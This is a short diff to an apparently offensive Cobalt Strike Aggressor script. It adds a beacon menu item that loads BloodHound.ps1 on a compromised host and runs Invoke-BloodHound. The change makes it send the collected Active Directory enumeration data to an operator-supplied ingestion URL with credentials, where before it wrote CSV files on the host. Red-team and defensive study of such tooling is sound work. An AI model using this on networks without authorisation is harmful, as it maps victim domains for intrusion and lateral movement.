@@ -2,12 +2,16 @@
 # @Und3rf10w
 
 sub run_bloodhound {
+	# Credits to Zack Henson for BloodHound implementation
 	$bid = $1;
 	binput($bid, "powershell-import " . script_resource("EnumKit/scripts/BloodHound.ps1"));
 	bpowershell_import($bid, script_resource("EnumKit/scripts/BloodHound.ps1"));
-	prompt_text("CSV output folder (on remote machine)", "C:\\Temp", {
-		binput($bid, "powershell Invoke-BloodHound -CSVFolder $1");
-		bpowershell($bid, "Invoke-BloodHound -CSVFolder $1");
+	prompt_text("Insert BloodHound Ingestion URL", "http://127.0.0.1:7474", {
+		$BloodHoundURI = $1;
+	});
+	prompt_text("Insert BloodHound Ingestion Username:Password", "user:password", {
+		binput($bid, "powershell Invoke-BloodHound -URI $BloodHoundURI -UserPass \"$1\" ");
+		bpowershell($bid, "Invoke-BloodHound -URI $BloodHoundURI -UserPass \"$1\" ");
 	});
 }
 
@@ -83,8 +87,8 @@ popup beacon_bottom {
 				}
 			}
 		}
-		menu "Bloodhound"{
-			item "Run Bloodhound"{
+		menu "BloodHound"{
+			item "Run BloodHound"{
 				local('$bid');
 				foreach $bid ($1){
 					run_bloodhound($bid);
